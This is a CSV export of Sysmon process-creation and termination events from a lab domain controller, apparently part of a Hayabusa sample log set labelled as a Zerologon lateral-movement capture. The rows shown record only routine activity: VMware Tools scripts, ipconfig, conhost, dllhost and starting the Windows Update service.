6,6,2022-02-23 09:43:46.3204039,1,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,3224,5464,dc1.test.local,0,S-1-5-18,Process creation,NT AUTHORITY\SYSTEM,,"ProcessID: 4524, ProcessGUID: 3b58b388-01d2-6216-7201-000000000500",RuleName: -,SHA256=935C1861DF1F4018D698E8B65ABFA02D7E9037D8F68CA3C2065B6CA165D44AD2,ParentProcess: C:\Program Files\VMware\VMware Tools\vmtoolsd.exe,"ParentProcessID: 2368, ParentProcessGUID: 3b58b388-9e32-6213-2700-000000000500","ParentCommandLine: ""C:\Program Files\VMware\VMware Tools\vmtoolsd.exe""","C:\Windows\system32\cmd.exe /c """"C:\Program Files\VMware\VMware Tools\resume-vm-default.bat""""",False,/evidence/windows-evtx-hayabusa-samples/LateralMovement/T1210_Zerologon_Sysmon.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName"",""#text"":""-""},{""@Name"":""UtcTime"",""#text"":""2022-02-23 09:43:46.309""},{""@Name"":""ProcessGuid"",""#text"":""3b58b388-01d2-6216-7201-000000000500""},{""@Name"":""ProcessId"",""#text"":""4524""},{""@Name"":""Image"",""#text"":""C:\\Windows\\System32\\cmd.exe""},{""@Name"":""FileVersion"",""#text"":""10.0.14393.0 (rs1_release.160715-1616)""},{""@Name"":""Description"",""#text"":""Windows Command Processor""},{""@Name"":""Product"",""#text"":""Microsoft® Windows® Operating System""},{""@Name"":""Company"",""#text"":""Microsoft Corporation""},{""@Name"":""OriginalFileName"",""#text"":""Cmd.Exe""},{""@Name"":""CommandLine"",""#text"":""C:\\Windows\\system32\\cmd.exe /c \""\""C:\\Program Files\\VMware\\VMware Tools\\resume-vm-default.bat\""\""""},{""@Name"":""CurrentDirectory"",""#text"":""C:\\Windows\\system32\\""},{""@Name"":""User"",""#text"":""NT AUTHORITY\\SYSTEM""},{""@Name"":""LogonGuid"",""#text"":""3b58b388-9e10-6213-e703-000000000000""},{""@Name"":""LogonId"",""#text"":""0x3E7""},{""@Name"":""TerminalSessionId"",""#text"":""0""},{""@Name"":""IntegrityLevel"",""#text"":""System""},{""@Name"":""Hashes"",""#text"":""SHA256=935C1861DF1F4018D698E8B65ABFA02D7E9037D8F68CA3C2065B6CA165D44AD2""},{""@Name"":""ParentProcessGuid"",""#text"":""3b58b388-9e32-6213-2700-000000000500""},{""@Name"":""ParentProcessId"",""#text"":""2368""},{""@Name"":""ParentImage"",""#text"":""C:\\Program Files\\VMware\\VMware Tools\\vmtoolsd.exe""},{""@Name"":""ParentCommandLine"",""#text"":""\""C:\\Program Files\\VMware\\VMware Tools\\vmtoolsd.exe\""""},{""@Name"":""ParentUser"",""#text"":""NT AUTHORITY\\SYSTEM""}]}}"
7,7,2022-02-23 09:43:46.3246722,1,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,3224,5464,dc1.test.local,0,S-1-5-18,Process creation,NT AUTHORITY\SYSTEM,,"ProcessID: 5744, ProcessGUID: 3b58b388-01d2-6216-7301-000000000500",RuleName: -,SHA256=046F7A1B4DE67562547ED9A180A72F481FC41E803DE49A96D7D7C731964D53A0,ParentProcess: C:\Windows\System32\cmd.exe,"ParentProcessID: 4524, ParentProcessGUID: 3b58b388-01d2-6216-7201-000000000500","ParentCommandLine: C:\Windows\system32\cmd.exe /c """"C:\Program Files\VMware\VMware Tools\resume-vm-default.bat""""",\??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1,False,/evidence/windows-evtx-hayabusa-samples/LateralMovement/T1210_Zerologon_Sysmon.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName"",""#text"":""-""},{""@Name"":""UtcTime"",""#text"":""2022-02-23 09:43:46.322""},{""@Name"":""ProcessGuid"",""#text"":""3b58b388-01d2-6216-7301-000000000500""},{""@Name"":""ProcessId"",""#text"":""5744""},{""@Name"":""Image"",""#text"":""C:\\Windows\\System32\\conhost.exe""},{""@Name"":""FileVersion"",""#text"":""10.0.14393.0 (rs1_release.160715-1616)""},{""@Name"":""Description"",""#text"":""Console Window Host""},{""@Name"":""Product"",""#text"":""Microsoft® Windows® Operating System""},{""@Name"":""Company"",""#text"":""Microsoft Corporation""},{""@Name"":""OriginalFileName"",""#text"":""CONHOST.EXE""},{""@Name"":""CommandLine"",""#text"":""\\??\\C:\\Windows\\system32\\conhost.exe 0xffffffff -ForceV1""},{""@Name"":""CurrentDirectory"",""#text"":""C:\\Windows""},{""@Name"":""User"",""#text"":""NT AUTHORITY\\SYSTEM""},{""@Name"":""LogonGuid"",""#text"":""3b58b388-9e10-6213-e703-000000000000""},{""@Name"":""LogonId"",""#text"":""0x3E7""},{""@Name"":""TerminalSessionId"",""#text"":""0""},{""@Name"":""IntegrityLevel"",""#text"":""System""},{""@Name"":""Hashes"",""#text"":""SHA256=046F7A1B4DE67562547ED9A180A72F481FC41E803DE49A96D7D7C731964D53A0""},{""@Name"":""ParentProcessGuid"",""#text"":""3b58b388-01d2-6216-7201-000000000500""},{""@Name"":""ParentProcessId"",""#text"":""4524""},{""@Name"":""ParentImage"",""#text"":""C:\\Windows\\System32\\cmd.exe""},{""@Name"":""ParentCommandLine"",""#text"":""C:\\Windows\\system32\\cmd.exe /c \""\""C:\\Program Files\\VMware\\VMware Tools\\resume-vm-default.bat\""\""""},{""@Name"":""ParentUser"",""#text"":""NT AUTHORITY\\SYSTEM""}]}}"
8,8,2022-02-23 09:43:46.3516659,1,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,3224,5464,dc1.test.local,0,S-1-5-18,Process creation,NT AUTHORITY\SYSTEM,,"ProcessID: 2476, ProcessGUID: 3b58b388-01d2-6216-7401-000000000500",RuleName: -,SHA256=5EE3FD7CA1AC876D0DE539D469BFC333594FCA3DF9F377CC96C756D9648697F1,ParentProcess: C:\Windows\System32\cmd.exe,"ParentProcessID: 4524, ParentProcessGUID: 3b58b388-01d2-6216-7201-000000000500","ParentCommandLine: C:\Windows\system32\cmd.exe /c """"C:\Program Files\VMware\VMware Tools\resume-vm-default.bat""""",C:\Windows\system32\ipconfig  /renew,False,/evidence/windows-evtx-hayabusa-samples/LateralMovement/T1210_Zerologon_Sysmon.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName"",""#text"":""-""},{""@Name"":""UtcTime"",""#text"":""2022-02-23 09:43:46.346""},{""@Name"":""ProcessGuid"",""#text"":""3b58b388-01d2-6216-7401-000000000500""},{""@Name"":""ProcessId"",""#text"":""2476""},{""@Name"":""Image"",""#text"":""C:\\Windows\\System32\\ipconfig.exe""},{""@Name"":""FileVersion"",""#text"":""10.0.14393.0 (rs1_release.160715-1616)""},{""@Name"":""Description"",""#text"":""IP Configuration Utility""},{""@Name"":""Product"",""#text"":""Microsoft® Windows® Operating System""},{""@Name"":""Company"",""#text"":""Microsoft Corporation""},{""@Name"":""OriginalFileName"",""#text"":""ipconfig.exe""},{""@Name"":""CommandLine"",""#text"":""C:\\Windows\\system32\\ipconfig  /renew""},{""@Name"":""CurrentDirectory"",""#text"":""C:\\Windows\\system32\\""},{""@Name"":""User"",""#text"":""NT AUTHORITY\\SYSTEM""},{""@Name"":""LogonGuid"",""#text"":""3b58b388-9e10-6213-e703-000000000000""},{""@Name"":""LogonId"",""#text"":""0x3E7""},{""@Name"":""TerminalSessionId"",""#text"":""0""},{""@Name"":""IntegrityLevel"",""#text"":""System""},{""@Name"":""Hashes"",""#text"":""SHA256=5EE3FD7CA1AC876D0DE539D469BFC333594FCA3DF9F377CC96C756D9648697F1""},{""@Name"":""ParentProcessGuid"",""#text"":""3b58b388-01d2-6216-7201-000000000500""},{""@Name"":""ParentProcessId"",""#text"":""4524""},{""@Name"":""ParentImage"",""#text"":""C:\\Windows\\System32\\cmd.exe""},{""@Name"":""ParentCommandLine"",""#text"":""C:\\Windows\\system32\\cmd.exe /c \""\""C:\\Program Files\\VMware\\VMware Tools\\resume-vm-default.bat\""\""""},{""@Name"":""ParentUser"",""#text"":""NT AUTHORITY\\SYSTEM""}]}}"
9,9,2022-02-23 09:43:46.3601870,5,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,3224,5464,dc1.test.local,0,S-1-5-18,Process terminated,NT AUTHORITY\SYSTEM,,"ProcessID: 2476, ProcessGUID: 3b58b388-01d2-6216-7401-000000000500",,,,,,C:\Windows\System32\ipconfig.exe,False,/evidence/windows-evtx-hayabusa-samples/LateralMovement/T1210_Zerologon_Sysmon.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName"",""#text"":""-""},{""@Name"":""UtcTime"",""#text"":""2022-02-23 09:43:46.355""},{""@Name"":""ProcessGuid"",""#text"":""3b58b388-01d2-6216-7401-000000000500""},{""@Name"":""ProcessId"",""#text"":""2476""},{""@Name"":""Image"",""#text"":""C:\\Windows\\System32\\ipconfig.exe""},{""@Name"":""User"",""#text"":""NT AUTHORITY\\SYSTEM""}]}}"
10,10,2022-02-23 09:43:46.3623975,5,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,3224,5464,dc1.test.local,0,S-1-5-18,Process terminated,NT AUTHORITY\SYSTEM,,"ProcessID: 4524, ProcessGUID: 3b58b388-01d2-6216-7201-000000000500",,,,,,C:\Windows\System32\cmd.exe,False,/evidence/windows-evtx-hayabusa-samples/LateralMovement/T1210_Zerologon_Sysmon.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName"",""#text"":""-""},{""@Name"":""UtcTime"",""#text"":""2022-02-23 09:43:46.355""},{""@Name"":""ProcessGuid"",""#text"":""3b58b388-01d2-6216-7201-000000000500""},{""@Name"":""ProcessId"",""#text"":""4524""},{""@Name"":""Image"",""#text"":""C:\\Windows\\System32\\cmd.exe""},{""@Name"":""User"",""#text"":""NT AUTHORITY\\SYSTEM""}]}}"
11,11,2022-02-23 09:43:46.3639474,5,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,3224,5464,dc1.test.local,0,S-1-5-18,Process terminated,NT AUTHORITY\SYSTEM,,"ProcessID: 5744, ProcessGUID: 3b58b388-01d2-6216-7301-000000000500",,,,,,C:\Windows\System32\conhost.exe,False,/evidence/windows-evtx-hayabusa-samples/LateralMovement/T1210_Zerologon_Sysmon.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName"",""#text"":""-""},{""@Name"":""UtcTime"",""#text"":""2022-02-23 09:43:46.355""},{""@Name"":""ProcessGuid"",""#text"":""3b58b388-01d2-6216-7301-000000000500""},{""@Name"":""ProcessId"",""#text"":""5744""},{""@Name"":""Image"",""#text"":""C:\\Windows\\System32\\conhost.exe""},{""@Name"":""User"",""#text"":""NT AUTHORITY\\SYSTEM""}]}}"
12,12,2022-02-23 09:43:56.0438608,1,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,3224,5464,dc1.test.local,0,S-1-5-18,Process creation,TEST\Administrator,,"ProcessID: 4380, ProcessGUID: 3b58b388-01dc-6216-7501-000000000500",RuleName: -,SHA256=EE8364C07B3F4F71FA649E0E6C4C73C15D285130E4B16E79890EEBBF89C2164E,ParentProcess: -,"ParentProcessID: 784, ParentProcessGUID: 00000000-0000-0000-0000-000000000000",ParentCommandLine: -,C:\Windows\system32\DllHost.exe /Processid:{DC4537C3-CA73-4AC7-9E1D-B2CE27C3A7A6},False,/evidence/windows-evtx-hayabusa-samples/LateralMovement/T1210_Zerologon_Sysmon.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName"",""#text"":""-""},{""@Name"":""UtcTime"",""#text"":""2022-02-23 09:43:56.041""},{""@Name"":""ProcessGuid"",""#text"":""3b58b388-01dc-6216-7501-000000000500""},{""@Name"":""ProcessId"",""#text"":""4380""},{""@Name"":""Image"",""#text"":""C:\\Windows\\System32\\dllhost.exe""},{""@Name"":""FileVersion"",""#text"":""10.0.14393.0 (rs1_release.160715-1616)""},{""@Name"":""Description"",""#text"":""COM Surrogate""},{""@Name"":""Product"",""#text"":""Microsoft® Windows® Operating System""},{""@Name"":""Company"",""#text"":""Microsoft Corporation""},{""@Name"":""OriginalFileName"",""#text"":""dllhost.exe""},{""@Name"":""CommandLine"",""#text"":""C:\\Windows\\system32\\DllHost.exe /Processid:{DC4537C3-CA73-4AC7-9E1D-B2CE27C3A7A6}""},{""@Name"":""CurrentDirectory"",""#text"":""C:\\Windows\\system32\\""},{""@Name"":""User"",""#text"":""TEST\\Administrator""},{""@Name"":""LogonGuid"",""#text"":""3b58b388-9fc6-6213-8975-060000000000""},{""@Name"":""LogonId"",""#text"":""0x67589""},{""@Name"":""TerminalSessionId"",""#text"":""1""},{""@Name"":""IntegrityLevel"",""#text"":""High""},{""@Name"":""Hashes"",""#text"":""SHA256=EE8364C07B3F4F71FA649E0E6C4C73C15D285130E4B16E79890EEBBF89C2164E""},{""@Name"":""ParentProcessGuid"",""#text"":""00000000-0000-0000-0000-000000000000""},{""@Name"":""ParentProcessId"",""#text"":""784""},{""@Name"":""ParentImage"",""#text"":""-""},{""@Name"":""ParentCommandLine"",""#text"":""-""},{""@Name"":""ParentUser"",""#text"":""-""}]}}"
13,13,2022-02-23 09:44:01.0602163,5,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,3224,5464,dc1.test.local,0,S-1-5-18,Process terminated,TEST\Administrator,,"ProcessID: 4380, ProcessGUID: 3b58b388-01dc-6216-7501-000000000500",,,,,,C:\Windows\System32\dllhost.exe,False,/evidence/windows-evtx-hayabusa-samples/LateralMovement/T1210_Zerologon_Sysmon.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName"",""#text"":""-""},{""@Name"":""UtcTime"",""#text"":""2022-02-23 09:44:01.058""},{""@Name"":""ProcessGuid"",""#text"":""3b58b388-01dc-6216-7501-000000000500""},{""@Name"":""ProcessId"",""#text"":""4380""},{""@Name"":""Image"",""#text"":""C:\\Windows\\System32\\dllhost.exe""},{""@Name"":""User"",""#text"":""TEST\\Administrator""}]}}"
14,14,2022-02-23 09:45:47.8454967,5,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,3224,5464,dc1.test.local,0,S-1-5-18,Process terminated,NT AUTHORITY\SYSTEM,,"ProcessID: 3240, ProcessGUID: 3b58b388-ff57-6215-6301-000000000500",,,,,,C:\Windows\System32\wbem\WmiPrvSE.exe,False,/evidence/windows-evtx-hayabusa-samples/LateralMovement/T1210_Zerologon_Sysmon.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName"",""#text"":""-""},{""@Name"":""UtcTime"",""#text"":""2022-02-23 09:45:47.839""},{""@Name"":""ProcessGuid"",""#text"":""3b58b388-ff57-6215-6301-000000000500""},{""@Name"":""ProcessId"",""#text"":""3240""},{""@Name"":""Image"",""#text"":""C:\\Windows\\System32\\wbem\\WmiPrvSE.exe""},{""@Name"":""User"",""#text"":""NT AUTHORITY\\SYSTEM""}]}}"
15,15,2022-02-23 09:46:24.0168866,1,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,3224,5464,dc1.test.local,0,S-1-5-18,Process creation,NT AUTHORITY\SYSTEM,,"ProcessID: 5528, ProcessGUID: 3b58b388-0270-6216-7601-000000000500",RuleName: -,SHA256=8A775B86CE1A057E290CCD26C59C96070684468A3119790743A346CD54F4DFDF,ParentProcess: C:\Windows\System32\svchost.exe,"ParentProcessID: 248, ParentProcessGUID: 3b58b388-9e11-6213-1000-000000000500",ParentCommandLine: C:\Windows\system32\svchost.exe -k netsvcs,C:\Windows\system32\sc.exe start wuauserv,False,/evidence/windows-evtx-hayabusa-samples/LateralMovement/T1210_Zerologon_Sysmon.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName"",""#text"":""-""},{""@Name"":""UtcTime"",""#text"":""2022-02-23 09:46:24.013""},{""@Name"":""ProcessGuid"",""#text"":""3b58b388-0270-6216-7601-000000000500""},{""@Name"":""ProcessId"",""#text"":""5528""},{""@Name"":""Image"",""#text"":""C:\\Windows\\System32\\sc.exe""},{""@Name"":""FileVersion"",""#text"":""10.0.14393.0 (rs1_release.160715-1616)""},{""@Name"":""Description"",""#text"":""Service Control Manager Configuration Tool""},{""@Name"":""Product"",""#text"":""Microsoft® Windows® Operating System""},{""@Name"":""Company"",""#text"":""Microsoft Corporation""},{""@Name"":""OriginalFileName"",""#text"":""sc.exe""},{""@Name"":""CommandLine"",""#text"":""C:\\Windows\\system32\\sc.exe start wuauserv""},{""@Name"":""CurrentDirectory"",""#text"":""C:\\Windows\\system32\\""},{""@Name"":""User"",""#text"":""NT AUTHORITY\\SYSTEM""},{""@Name"":""LogonGuid"",""#text"":""3b58b388-9e10-6213-e703-000000000000""},{""@Name"":""LogonId"",""#text"":""0x3E7""},{""@Name"":""TerminalSessionId"",""#text"":""0""},{""@Name"":""IntegrityLevel"",""#text"":""System""},{""@Name"":""Hashes"",""#text"":""SHA256=8A775B86CE1A057E290CCD26C59C96070684468A3119790743A346CD54F4DFDF""},{""@Name"":""ParentProcessGuid"",""#text"":""3b58b388-9e11-6213-1000-000000000500""},{""@Name"":""ParentProcessId"",""#text"":""248""},{""@Name"":""ParentImage"",""#text"":""C:\\Windows\\System32\\svchost.exe""},{""@Name"":""ParentCommandLine"",""#text"":""C:\\Windows\\system32\\svchost.exe -k netsvcs""},{""@Name"":""ParentUser"",""#text"":""NT AUTHORITY\\SYSTEM""}]}}"
16,16,2022-02-23 09:46:24.0237015,1,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,3224,5464,dc1.test.local,0,S-1-5-18,Process creation,NT AUTHORITY\SYSTEM,,"ProcessID: 5300, ProcessGUID: 3b58b388-0270-6216-7701-000000000500",RuleName: -,SHA256=046F7A1B4DE67562547ED9A180A72F481FC41E803DE49A96D7D7C731964D53A0,ParentProcess: C:\Windows\System32\sc.exe,"ParentProcessID: 5528, ParentProcessGUID: 3b58b388-0270-6216-7601-000000000500",ParentCommandLine: C:\Windows\system32\sc.exe start wuauserv,\??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1,False,/evidence/windows-evtx-hayabusa-samples/LateralMovement/T1210_Zerologon_Sysmon.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName"",""#text"":""-""},{""@Name"":""UtcTime"",""#text"":""2022-02-23 09:46:24.020""},{""@Name"":""ProcessGuid"",""#text"":""3b58b388-0270-6216-7701-000000000500""},{""@Name"":""ProcessId"",""#text"":""5300""},{""@Name"":""Image"",""#text"":""C:\\Windows\\System32\\conhost.exe""},{""@Name"":""FileVersion"",""#text"":""10.0.14393.0 (rs1_release.160715-1616)""},{""@Name"":""Description"",""#text"":""Console Window Host""},{""@Name"":""Product"",""#text"":""Microsoft® Windows® Operating System""},{""@Name"":""Company"",""#text"":""Microsoft Corporation""},{""@Name"":""OriginalFileName"",""#text"":""CONHOST.EXE""},{""@Name"":""CommandLine"",""#text"":""\\??\\C:\\Windows\\system32\\conhost.exe 0xffffffff -ForceV1""},{""@Name"":""CurrentDirectory"",""#text"":""C:\\Windows""},{""@Name"":""User"",""#text"":""NT AUTHORITY\\SYSTEM""},{""@Name"":""LogonGuid"",""#text"":""3b58b388-9e10-6213-e703-000000000000""},{""@Name"":""LogonId"",""#text"":""0x3E7""},{""@Name"":""TerminalSessionId"",""#text"":""0""},{""@Name"":""IntegrityLevel"",""#text"":""System""},{""@Name"":""Hashes"",""#text"":""SHA256=046F7A1B4DE67562547ED9A180A72F481FC41E803DE49A96D7D7C731964D53A0""},{""@Name"":""ParentProcessGuid"",""#text"":""3b58b388-0270-6216-7601-000000000500""},{""@Name"":""ParentProcessId"",""#text"":""5528""},{""@Name"":""ParentImage"",""#text"":""C:\\Windows\\System32\\sc.exe""},{""@Name"":""ParentCommandLine"",""#text"":""C:\\Windows\\system32\\sc.exe start wuauserv""},{""@Name"":""ParentUser"",""#text"":""NT AUTHORITY\\SYSTEM""}]}}"
17,17,2022-02-23 09:46:24.0398639,5,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,3224,5464,dc1.test.local,0,S-1-5-18,Process terminated,NT AUTHORITY\SYSTEM,,"ProcessID: 5528, ProcessGUID: 3b58b388-0270-6216-7601-000000000500",,,,,,C:\Windows\System32\sc.exe,False,/evidence/windows-evtx-hayabusa-samples/LateralMovement/T1210_Zerologon_Sysmon.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName"",""#text"":""-""},{""@Name"":""UtcTime"",""#text"":""2022-02-23 09:46:24.027""},{""@Name"":""ProcessGuid"",""#text"":""3b58b388-0270-6216-7601-000000000500""},{""@Name"":""ProcessId"",""#text"":""5528""},{""@Name"":""Image"",""#text"":""C:\\Windows\\System32\\sc.exe""},{""@Name"":""User"",""#text"":""NT AUTHORITY\\SYSTEM""}]}}"
18,18,2022-02-23 09:46:24.0409181,5,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,3224,5464,dc1.test.local,0,S-1-5-18,Process terminated,NT AUTHORITY\SYSTEM,,"ProcessID: 5300, ProcessGUID: 3b58b388-0270-6216-7701-000000000500",,,,,,C:\Windows\System32\conhost.exe,False,/evidence/windows-evtx-hayabusa-samples/LateralMovement/T1210_Zerologon_Sysmon.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName"",""#text"":""-""},{""@Name"":""UtcTime"",""#text"":""2022-02-23 09:46:24.027""},{""@Name"":""ProcessGuid"",""#text"":""3b58b388-0270-6216-7701-000000000500""},{""@Name"":""ProcessId"",""#text"":""5300""},{""@Name"":""Image"",""#text"":""C:\\Windows\\System32\\conhost.exe""},{""@Name"":""User"",""#text"":""NT AUTHORITY\\SYSTEM""}]}}"
19,19,2022-02-23 09:47:42.6462898,5,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,3224,5464,dc1.test.local,0,S-1-5-18,Process terminated,TEST\Administrator,,"ProcessID: 5044, ProcessGUID: 3b58b388-ffef-6215-6901-000000000500",,,,,,C:\Windows\System32\mmc.exe,False,/evidence/windows-evtx-hayabusa-samples/LateralMovement/T1210_Zerologon_Sysmon.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName"",""#text"":""-""},{""@Name"":""UtcTime"",""#text"":""2022-02-23 09:47:42.636""},{""@Name"":""ProcessGuid"",""#text"":""3b58b388-ffef-6215-6901-000000000500""},{""@Name"":""ProcessId"",""#text"":""5044""},{""@Name"":""Image"",""#text"":""C:\\Windows\\System32\\mmc.exe""},{""@Name"":""User"",""#text"":""TEST\\Administrator""}]}}"
20,20,2022-02-23 09:47:45.1703055,1,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,3224,5464,dc1.test.local,0,S-1-5-18,Process creation,TEST\Administrator,,"ProcessID: 5212, ProcessGUID: 3b58b388-02c1-6216-7801-000000000500",RuleName: -,SHA256=EE8364C07B3F4F71FA649E0E6C4C73C15D285130E4B16E79890EEBBF89C2164E,ParentProcess: -,"ParentProcessID: 784, ParentProcessGUID: 00000000-0000-0000-0000-000000000000",ParentCommandLine: -,C:\Windows\system32\DllHost.exe /Processid:{DC4537C3-CA73-4AC7-9E1D-B2CE27C3A7A6},False,/evidence/windows-evtx-hayabusa-samples/LateralMovement/T1210_Zerologon_Sysmon.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName"",""#text"":""-""},{""@Name"":""UtcTime"",""#text"":""2022-02-23 09:47:45.168""},{""@Name"":""ProcessGuid"",""#text"":""3b58b388-02c1-6216-7801-000000000500""},{""@Name"":""ProcessId"",""#text"":""5212""},{""@Name"":""Image"",""#text"":""C:\\Windows\\System32\\dllhost.exe""},{""@Name"":""FileVersion"",""#text"":""10.0.14393.0 (rs1_release.160715-1616)""},{""@Name"":""Description"",""#text"":""COM Surrogate""},{""@Name"":""Product"",""#text"":""Microsoft® Windows® Operating System""},{""@Name"":""Company"",""#text"":""Microsoft Corporation""},{""@Name"":""OriginalFileName"",""#text"":""dllhost.exe""},{""@Name"":""CommandLine"",""#text"":""C:\\Windows\\system32\\DllHost.exe /Processid:{DC4537C3-CA73-4AC7-9E1D-B2CE27C3A7A6}""},{""@Name"":""CurrentDirectory"",""#text"":""C:\\Windows\\system32\\""},{""@Name"":""User"",""#text"":""TEST\\Administrator""},{""@Name"":""LogonGuid"",""#text"":""3b58b388-9fc6-6213-8975-060000000000""},{""@Name"":""LogonId"",""#text"":""0x67589""},{""@Name"":""TerminalSessionId"",""#text"":""1""},{""@Name"":""IntegrityLevel"",""#text"":""High""},{""@Name"":""Hashes"",""#text"":""SHA256=EE8364C07B3F4F71FA649E0E6C4C73C15D285130E4B16E79890EEBBF89C2164E""},{""@Name"":""ParentProcessGuid"",""#text"":""00000000-0000-0000-0000-000000000000""},{""@Name"":""ParentProcessId"",""#text"":""784""},{""@Name"":""ParentImage"",""#text"":""-""},{""@Name"":""ParentCommandLine"",""#text"":""-""},{""@Name"":""ParentUser"",""#text"":""-""}]}}"
